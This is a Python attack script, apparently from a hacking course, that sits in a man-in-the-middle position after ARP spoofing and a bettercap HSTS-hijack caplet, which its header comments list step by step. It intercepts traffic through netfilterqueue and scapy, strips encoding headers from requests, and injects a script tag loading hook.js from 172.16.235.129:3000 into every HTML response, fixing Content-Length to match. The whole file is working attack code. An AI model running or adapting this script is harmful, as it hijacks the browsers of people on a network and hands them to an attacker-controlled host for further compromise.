#!/usr/bin/env python3

# Steps
# 1. $
# 2. $ sudo iptables -F
# 3. $ sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# 4. $ sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# 5. $ sudo arp_spoof.py (with -t and -g set)
# 6. $ sudo bettercap -caplet hstshijack/hstshijack
# 7. $ sudo https_code_injector.py

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    print('[+] Replacing file')
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            injection_code = '<script src="http://172.16.235.129:3000/hook.js"></script>'

            if scapy_packet[scapy.TCP].dport == 80:
                print('[+] Request')
                load = re.sub(
                    'Accept-Encoding:.*?\\r\\n', '', load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print('[+] Response')

                load = load.replace('</body>', injection_code + '</body>')

                content_length_search = re.search(
                    '(?:Content-Length:\s)(\d*)', load)

                if content_length_search and 'text/html' in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(
                        content_length) + len(injection_code)

                    load = load.replace(
                        str(content_length), str(new_content_length))

            if load != str(scapy_packet[scapy.Raw].load):
                new_packet = set_load(scapy_packet, load)

                print(new_packet.show())

                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
